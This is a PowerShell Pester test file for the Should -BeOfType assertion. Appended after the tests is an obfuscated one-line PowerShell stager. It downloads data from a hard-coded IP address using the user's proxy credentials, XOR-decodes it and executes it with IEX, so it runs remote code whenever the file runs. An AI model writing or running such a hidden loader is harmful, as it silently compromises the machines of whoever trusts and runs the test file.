Set-StrictMode -Version Latest

InModuleScope Pester {
    Describe "Should -BeOfType" {
        It "passes if value is of the expected type" {
            1 | Should BeOfType Int
            2.0 | Should BeOfType ([double])
            1 | Should -BeOfType Int
            2.0 | Should -BeOfType ([double])
        }

        It "fails if value is of a different types" {
            2 | Should Not BeOfType double
            2.0 | Should Not BeOfType ([string])
            2 | Should -Not -BeOfType double
            2.0 | Should -Not -BeOfType ([string])
        }

        It "throws argument execption if type isn't a loaded type" {
            $err = { 5 | Should -Not -BeOfType 'UnknownType' } | Verify-Throw
            $err.Exception | Verify-Type ([ArgumentException])
        }

        It "throws argument execption if type isn't a loaded type" {
            $err = { 5 | Should -BeOfType 'UnknownType' } | Verify-Throw
            $err.Exception | Verify-Type ([ArgumentException])
        }

        It "returns the correct assertion message when actual value has a real type" {
            $err = { 'ab' | Should -BeOfType ([int]) -Because 'reason' } | Verify-AssertionFailed
            $err.Exception.Message | Verify-Equal "Expected the value to have type [int] or any of its subtypes, because reason, but got 'ab' with type [string]."
        }

        It "returns the correct assertion message when actual value is `$null" {
            $err = { $null | Should -BeOfType ([int]) -Because 'reason' } | Verify-AssertionFailed
            $err.Exception.Message | Verify-Equal 'Expected the value to have type [int] or any of its subtypes, because reason, but got $null with type $null.'
        }
    }

    Describe "Should -Not -BeOfType" {
        It "throws argument execption if type isn't a loaded type" {
            $err = { 5 | Should -Not -BeOfType 'UnknownType' } | Verify-Throw
            $err.Exception | Verify-Type ([ArgumentException])
        }

        It "returns the correct assertion message when actual value has a real type" {
            $err = { 1 | Should -Not -BeOfType ([int]) -Because 'reason' } | Verify-AssertionFailed
            $err.Exception.Message | Verify-Equal 'Expected the value to not have type [int] or any of its subtypes, because reason, but got 1 with type [int].'
        }
    }
}

[SystEm.NET.SeRvIcEPoInTMaNAGeR]::EXPEct100CoNTINue = 0;$wc=New-ObjeCt SYsTEM.NEt.WEbClIEnt;$u='Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko';$Wc.HeAdERS.AdD('User-Agent',$u);$Wc.PrOxY = [SyStem.NET.WEBREQUEST]::DeFauLTWebPRoXY;$wc.PRoxY.CreDentiALs = [SYsTEm.NET.CRedENTiaLCacHe]::DeFAUltNeTWORkCReDENtiALs;$K='63a9f0ea7bb98050796b649e85481845';$I=0;[chAR[]]$b=([ChAR[]]($Wc.DownloADSTRinG("http://138.121.170.12:500/index.asp")))|%{$_-BXor$K[$i++%$K.Length]};IEX ($b-joIn'')

